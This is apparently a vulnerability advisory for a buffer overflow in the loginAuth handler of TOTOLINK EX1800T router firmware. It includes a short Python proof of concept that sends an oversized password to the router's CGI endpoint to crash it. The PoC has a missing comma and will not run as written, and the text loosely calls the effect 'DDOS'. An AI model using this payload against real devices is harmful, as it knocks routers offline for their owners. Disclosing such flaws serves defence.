## TOTOLINK EX1800T have buffer overflow vulnerability in loginAuth.

## Overview

- Manufacturer's website information：https://www.totolink.net/
- Firmware download address：https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/223/ids/36.html

## Affected version

 TOTOLINK EX1800T  V9.1.0cu.2112_B20220316

## Vulnerability details

In the TOTOLINK EX1800T   V9.1.0cu.2112_B20220316 firmware has a buffer overflow vulnerability In `loginAuth` function.  `v7` receives the password parameter,and passes it to the `urldecode` function for processing. However, since the user can control the input of `password`,The `urldecode` can cause a buffer overflow vulnerability.

![Image](https://github.com/user-attachments/assets/24b75beb-0495-431a-86f5-8dc03b0d75b5)

The `urldecode` function does not limit the length of the string, so a malicious attacker can construct the data to be interpreted as DDOS.

![Image](https://github.com/user-attachments/assets/01cf005a-dd84-4540-a939-1cfb11baee58)

## POC

```
import requests
url = "http://127.0.0.1/cgi-bin/cstecgi.cgi"
data = {
"token": ""
"topicurl":"loginAuth",
"password":"b"*0x2000,
}
response = requests.post(url, json=data)
print(response.text)
```

![Image](https://github.com/user-attachments/assets/875ed8ac-721d-4a68-948c-b01dfad4e473)

![Image](https://github.com/user-attachments/assets/60cde689-5e38-4b89-8a05-38750e91118f)